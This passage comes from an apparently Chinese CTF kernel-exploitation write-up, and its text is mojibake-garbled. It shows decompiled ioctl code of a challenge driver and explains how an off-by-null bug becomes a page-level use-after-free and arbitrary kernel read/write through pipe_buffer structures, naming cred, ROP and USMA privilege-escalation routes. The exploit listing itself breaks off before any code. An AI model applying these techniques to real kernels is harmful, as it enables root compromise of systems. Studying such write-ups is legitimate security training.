v23; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v24; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v25; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v26; <span class="comment">// [rsp-48h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v27; <span class="comment">// [rsp-44h] [rbp-44h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp-40h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v29; <span class="comment">// [rsp-38h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v29 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  raw_spin_lock(&amp;spin);</span><br><span class="line">  v4 = copy_from_user(&amp;v26, a3, <span class="number">16LL</span>);</span><br><span class="line">  v5 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x80F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x810</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v26 &gt; <span class="number">0xF</span>uLL || !qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = &amp;unk_882;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      kmem_cache_free(kcache_jar);</span><br><span class="line">      v20 = (<span class="keyword">int</span>)v26;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">int</span>)v26 &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        _ubsan_handle_out_of_bounds(&amp;off_12A0, v26);</span><br><span class="line">        v21 = (<span class="keyword">int</span>)v26;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * v20] = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v21 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          _ubsan_handle_out_of_bounds(&amp;off_12C0, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v21);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * (<span class="keyword">int</span>)v26] = <span class="number">0LL</span>;</span><br><span class="line">        v21 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v20;</span><br><span class="line">      &#125;</span><br><span class="line">      kcache_list[<span class="number">4</span> * v21] = <span class="number">0</span>;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">6425</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">      <span class="keyword">if</span> ( v26 &gt; <span class="number">0xF</span>uLL || !qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = &amp;unk_85D;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      v11 = v27;</span><br><span class="line">      <span class="keyword">if</span> ( v27 &gt; kcache_list[<span class="number">4</span> * v26] )</span><br><span class="line">        v11 = kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">      <span class="keyword">if</span> ( v11 &lt; <span class="number">0</span> )</span><br><span class="line">        BUG();</span><br><span class="line">      v12 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11;</span><br><span class="line">      v13 = qword_17D8[<span class="number">2</span> * v26];</span><br><span class="line">      v14 = v28;</span><br><span class="line">      _check_object_size(v13, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11, <span class="number">1LL</span>);</span><br><span class="line">      v5 = -(__int64)(copy_to_user(v14, v13, v12) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x114</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0x514</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v26 &lt;= <span class="number">0xF</span>uLL &amp;&amp; qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v27;</span><br><span class="line">          <span class="keyword">if</span> ( v27 &gt; <span class="number">0x800</span> || v27 + kcache_list[<span class="number">4</span> * v26] &gt;= <span class="number">0x800</span> )</span><br><span class="line">            v7 = <span class="number">2048</span> - kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">          <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          v8 = qword_17D8[<span class="number">2</span> * v26] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">          v9 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7;</span><br><span class="line">          v10 = v28;</span><br><span class="line">          _check_object_size(v8, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !copy_from_user(v8, v10, v9) )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_BYTE *)(v8 + v9) = <span class="number">0</span>;</span><br><span class="line">            v5 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        v25 = &amp;unk_837;</span><br><span class="line">LABEL_46:</span><br><span class="line">        printk(v25);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_42:</span><br><span class="line">      v25 = &amp;unk_8AA;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v26 &gt;= <span class="number">0x10</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_782;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_7F6;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    v15 = kmem_cache_alloc(kcache_jar, <span class="number">0xDC0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_81A;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    v16 = v15;</span><br><span class="line">    v17 = v27;</span><br><span class="line">    v18 = <span class="number">2048LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v27 &lt; <span class="number">0x800</span> )</span><br><span class="line">      v18 = v27;</span><br><span class="line">    v19 = v28;</span><br><span class="line">    _check_object_size(v15, v18, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v16, v19, v18) )</span><br><span class="line">    &#123;</span><br><span class="line">      kmem_cache_free(kcache_jar);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v22 = <span class="number">0x7FF</span>LL;</span><br><span class="line">      <span class="keyword">if</span> ( v17 &lt; <span class="number">0x7FF</span> )</span><br><span class="line">        v22 = v17;</span><br><span class="line">      *(_BYTE *)(v16 + v22) = <span class="number">0</span>;</span><br><span class="line">      v23 = (<span class="keyword">int</span>)v26;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">int</span>)v26 &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        _ubsan_handle_out_of_bounds(&amp;off_1260, v26);</span><br><span class="line">        v24 = (<span class="keyword">int</span>)v26;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * v23] = v16;</span><br><span class="line">        <span class="keyword">if</span> ( v24 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          _ubsan_handle_out_of_bounds(&amp;off_1280, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v24);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * (<span class="keyword">int</span>)v26] = v16;</span><br><span class="line">        v24 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v23;</span><br><span class="line">      &#125;</span><br><span class="line">      kcache_list[<span class="number">4</span> * v24] = v18;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_2:</span><br><span class="line">  raw_spin_unlock(&amp;spin);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†å°±æ˜¯ioctlå‡½æ•°ï¼Œé€†å‘åˆ†æè¿‡åå¯ä»¥å‘ç°è¿™é‡Œåˆ†ä¸ºå››ä¸ªåˆ†æ”¯ï¼Œä¹Ÿå°±æ˜¯å¢åˆ æ”¹æŸ¥ï¼Œè¿™é‡Œæ¼æ´å‘ç”Ÿåœ¨å¢å’Œæ”¹çš„éƒ¨åˆ†ï¼Œå­˜åœ¨å¾ˆæ˜æ˜¾çš„<code>off by null</code>ã€‚é™¤æ­¤ä¹‹å¤–å†æ— å…¶ä»–æ¼æ´ã€‚</p><h3 id="é¢„æœŸåˆ©ç”¨åˆ†æ"><a href="#é¢„æœŸåˆ©ç”¨åˆ†æ" class="headerlink" title="é¢„æœŸåˆ©ç”¨åˆ†æ"></a>é¢„æœŸåˆ©ç”¨åˆ†æ</h3><p>æ ¹æ®å‰é¢æ‰€è¿°çš„å†…å®¹ï¼Œç›®å‰å·²ç»è¾¾åˆ°äº†<code>vuln slab page</code>å’Œ<code>victim slab page</code>ç›¸é‚»çš„æƒ…å†µäº†ï¼Œè€Œç»è¿‡åç»­çš„åˆ†ææˆ‘ä»¬å¯ä»¥å¾—çŸ¥å‰é¢ä¸¤ä¸ªé¡µé¢åˆ†åˆ«å¯¹åº”çš„æ˜¯é¢˜ç›®ä¸­åˆ›å»ºçš„<code>slab page</code>å’Œ<code>pipe_buffer</code>æ‰€åœ¨çš„<code>slab_page</code>ã€‚ç­”æ¡ˆå·²ç»å‘¼ä¹‹æ¬²å‡ºäº†ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨é¢˜ç›®çš„<code>off by null</code>æ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®©<code>pipe_buffer-&gt;page</code>æŒ‡é’ˆæŒ‡å‘å…¶ä»–<code>pipe_buffer</code>æ‰€æŒ‡å‘çš„ä½ç½®ï¼Œè€Œå¦‚æœæˆ‘ä»¬æ§åˆ¶å…¶ä¸­ä¸€ä¸ª<code>pipe_buffer</code>å¹¶é‡Šæ”¾æ‰pageï¼Œå°±å½¢æˆäº†é¡µçº§çš„UAFã€‚ä¸è¿‡pageçš„å¤§å°åªæœ‰<code>0x40</code>æ‰€ä»¥æˆåŠŸç‡åªæœ‰1/4ï¼Œå› ä¸ºä»¥<code>0x00</code>ç»“å°¾æ—¶<code>off by null</code>æ— æ³•å½±å“å…¶æŒ‡å‘ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519171327450.png"                      alt="image-20230519171327450"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519171353853.png"                      alt="image-20230519171353853"                ></p><p>ç›®å‰æˆ‘ä»¬å·²ç»å½¢æˆäº†é¡µçº§çš„UAFï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬åœ¨å·²ç»freeçš„pageå¤„ç”³è¯·<code>pipe_buffer</code>ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519173248182.png"                      alt="image-20230519173248182"                ></p><p>ç»“æœå°±æ˜¯ä¼šå½¢æˆå¦‚ä¸Šå›¾ä¸€æ ·çš„ç»“æ„ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡æœ€å·¦è¾¹çš„<code>pipe_buffer</code>è¯»å–åˆ°å®ƒpageæŒ‡å‘çš„æ–°çš„<code>pipe_buffer</code>ä¸­çš„å†…å®¹ï¼Œå¹¶ä¸”æ­¤æ—¶æˆ‘ä»¬ä¸å…‰å¯ä»¥è¯»å–è¿˜å¯ä»¥å¯¹pageçš„å†…å®¹è¿›è¡Œå†™ï¼Œå¯ä»¥è®©æœ€å³è¾¹çš„ä¸¤ä¸ª<code>pipe_buffer</code>çš„pageæŒ‡é’ˆåˆæŒ‡å‘åŒä¸€ä¸ªï¼Œä»è€Œå½¢æˆä¸‹é¢è¿™ç§æƒ…å†µï¼š<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519173704454.png"                      alt="image-20230519173704454"                ></p><p>æ ¹æ®ä¸Šé¢çš„æ€è·¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†æœ€å³è¾¹çš„pageç»™freeæ‰åˆä¸€æ¬¡é€ æˆäº†é¡µçº§çš„UAFï¼Œä½†æ˜¯è¿™ä¸€æ¬¡ä¸åŒçš„æ˜¯æˆ‘ä»¬é€šè¿‡ç¬¬ä¸€æ¬¡çš„æ³„æ¼å¯ä»¥çŸ¥é“æœ€å³è¾¹pageçš„åœ°å€çš„ã€‚æœ‰è¶£çš„æ¥äº†ï¼Œåœ¨æœ€å³è¾¹é€ æˆäº†é¡µçº§çš„UAFä¹‹åæˆ‘ä»¬ç»§ç»­ç”³è¯·<code>pipe_buffer</code>æ”¾åœ¨æœ€å³è¾¹çš„pageä¸­ï¼Œå¹¶ä¸”æ§åˆ¶é‡Œé¢<code>pipe_buffer</code>çš„pageæŒ‡é’ˆæŒ‡å‘è‡ªèº«ï¼Œæœ€ç»ˆå½¢æˆä¸‹é¢è¿™ç§æƒ…å†µï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519174027597.png"                      alt="image-20230519174027597"                ></p><p>å› ä¸ºæ˜¯ä¸€ä¸ªé¡µçº§UAFçš„ç¼˜æ•…ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ä¸­é—´çš„pipeå»ä¿®æ”¹ä¸‹é¢çš„å…¶ä»–<code>pipe_buffer</code>ï¼Œæ‰€ä»¥åœ¨æœ€å³ä¾§ï¼Œæˆ‘ä»¬æ€»å…±å¯ä»¥æ§åˆ¶åˆ°ä¸‰ä¸ª<code>pipe_buffer</code>ã€‚è€Œè¿™ä¸‰ä¸ª<code>pipe_buffer</code>çš„ä½œç”¨åˆ†åˆ«æ˜¯ï¼š</p><ol><li>  ç¬¬ä¸€ä¸ªç®¡é“é€šè¿‡pageæŒ‡é’ˆå†…å­˜ç©ºé—´çš„ä»»æ„åœ°å€è¯»å†™</li><li>  ç¬¬äºŒä¸ªç®¡é“ç”¨äºä¿®æ”¹ç¬¬ä¸‰ä¸ªç®¡é“çš„å†…å®¹ï¼Œè®©ç¬¬ä¸‰ä¸ªç®¡é“å¯ä»¥æŒ‡å‘ç¬¬ä¸€ä¸ªç®¡é“</li><li>  ç¬¬ä¸‰ä¸ªç®¡é“ç”¨äºä¿®æ”¹ç¬¬ä¸€ä¸ªç®¡é“å’Œç¬¬äºŒä¸ªç®¡é“ï¼Œä¿®æ”¹ç¬¬ä¸€ä¸ªç®¡é“çš„pageåˆ°æŒ‡å®šä½ç½®ï¼Œä¿®æ”¹ç¬¬äºŒä¸ªç®¡é“çš„æŒ‡å‘ä¸ºç¬¬ä¸‰ä¸ªç®¡é“</li></ol><p>è¿™æ ·ä¸‰ä¸ªç®¡é“å®ç°äº’ç›¸å¾ªç¯ä¿®æ”¹ï¼Œå³å¯å®ç°æ•´ä¸ªå†…æ ¸å†…å­˜ç©ºé—´å‡ ä¹æ— ä»»ä½•é™åˆ¶çš„ä»»æ„åœ°å€è¯»å†™ã€‚</p><p>æ—¢ç„¶å·²ç»å¯ä»¥ä»»æ„åœ°å€æ— é™åˆ¶è¯»å†™äº†ï¼Œé‚£ä¹ˆææƒçš„æ–¹å¼ä¹Ÿå°±å¤šç§å¤šæ ·äº†ã€‚å½“ç„¶ï¼Œè¿™é‡Œéœ€è¦æå‰æ³¨æ„åˆ°çš„æ˜¯<code>pipe_buffer</code>ä¸­çš„pageæŒ‡é’ˆç»ˆå½’æ˜¯è¦æŒ‡å‘åˆ°pageç»“æ„ä½“çš„ã€‚è€Œå†…æ ¸ä¸­<code>vmemmap</code>åŒºåŸŸä¸­å­˜æ”¾ç€æ‰€æœ‰çš„pageç»“æ„ä½“ï¼Œæ‰€ä»¥é¦–è¦æ‰¾åˆ°<code>vmemmap</code>åŒºåŸŸå³å¯ã€‚</p><p>é‚£ä¹ˆç¬¬ä¸€ç§æ–¹æ³•å°±æ˜¯é€šè¿‡ä¿®æ”¹task_structä¸­çš„credæŒ‡é’ˆä¸º<code>init_cred</code>çš„åœ°å€ã€‚</p><p>ç¬¬äºŒç§æ–¹æ³•å°±æ˜¯é€šè¿‡å†™å†…æ ¸æ ˆå®ç°ROPçš„åŠæ³•ï¼Œé¦–å…ˆéœ€è¦æ³„æ¼å‡ºæ ˆåœ°å€ï¼Œåœ¨<code>task_struct</code>ç»“æ„ä½“ä¸­å­˜åœ¨ä¸€ä¸ªstackæˆå‘˜ï¼Œé¡¾åæ€ä¹‰å…¶ä¸­å­˜æ”¾çš„å°±æ˜¯æ ˆåœ°å€ï¼Œä¸è¿‡è¿™é‡Œå­˜æ”¾çš„æ˜¯è™šæ‹Ÿåœ°å€ã€‚ä¸è¿‡æˆ‘ä»¬å¦‚æœè¦å¾€æ ˆç©ºé—´ä¸­å†™å†…å®¹çš„è¯éœ€è¦çŸ¥é“ä»–å¯¹åº”çš„ç‰©ç†åœ°å€å¯¹åº”çš„pageç»“æ„åœ°å€ã€‚å¥½åœ¨æˆ‘ä»¬å¯ä»¥é€šè¿‡é¡µè¡¨è·å–åˆ°å¯¹åº”çš„ç‰©ç†åœ°å€ï¼Œåœ¨<code>task_struct</code>ç»“æ„ä½“ä¸­çš„<code>mm</code>æˆå‘˜ä¸­å­˜æ”¾çš„æ˜¯<code>mm_struct</code>ç»“æ„ä½“çš„åœ°å€ï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>mm_struct</code>ç»“æ„ä½“ä¸­çš„<code>pgd</code>æˆå‘˜è·å–åˆ°é¡µè¡¨çš„åœ°å€ã€‚æœ€åé€šè¿‡ä¹Ÿå˜è½¬åŒ–å³å¯è·å–åˆ°æ ˆåœ°å€å¯¹åº”çš„pageç»“æ„ä½“åœ°å€äº†ï¼Œè¿›è€Œå¾€æ ˆä¸­å†™å…¥å‡†å¤‡çš„ropå³å¯ã€‚</p><p>ç¬¬ä¸‰ç§æ–¹æ³•å°±æ˜¯é€šè¿‡<code>USMA</code>è¿›è¡Œåˆ©ç”¨ä¹Ÿå°±æ˜¯<a class="link"   href="https://vul.360.net/archives/391" >ç”¨æˆ·æ€æ˜ å°„æ”»å‡»<i class="fas fa-external-link-alt"></i></a>ï¼ŒåŸç†åˆ™æ˜¯ä¿®æ”¹å†…æ ¸ä»£ç æ®µçš„å†…å®¹ï¼Œä¸è¿‡ç›´æ¥é€šè¿‡ç›´æ¥æ˜ å°„åŒºå»ä¿®æ”¹çš„è¯ä¼šå› ä¸ºæ²¡æœ‰å†™å…¥æƒé™é€ æˆ<code>kernel panic</code>ã€‚ä½†æ˜¯ï¼Œæ”¹å†™å†…æ ¸ä»£ç æ®µçš„æœ¬è´¨æ˜¯å‘å…¶æ‰€å¯¹åº”çš„ç‰©ç†é¡µé¢å†™å…¥æ•°æ®ï¼Œæ‰€ä»¥æ—¢ç„¶æˆ‘ä»¬å¯ä»¥å¯¹é¡µè¡¨è¿›è¡Œè¯»å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åœ¨ç”¨æˆ·ç©ºé—´å»ºç«‹ä¸€ä¸ªåˆ°å†…æ ¸ä»£ç æ®µå¯¹åº”ç‰©ç†å†…å­˜çš„æ˜ å°„å°±å¯ä»¥æ”¹å†™å†…æ ¸ä»£ç äº†ã€‚</p><h3 id="ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp"><a href="#ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp"></a>ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span 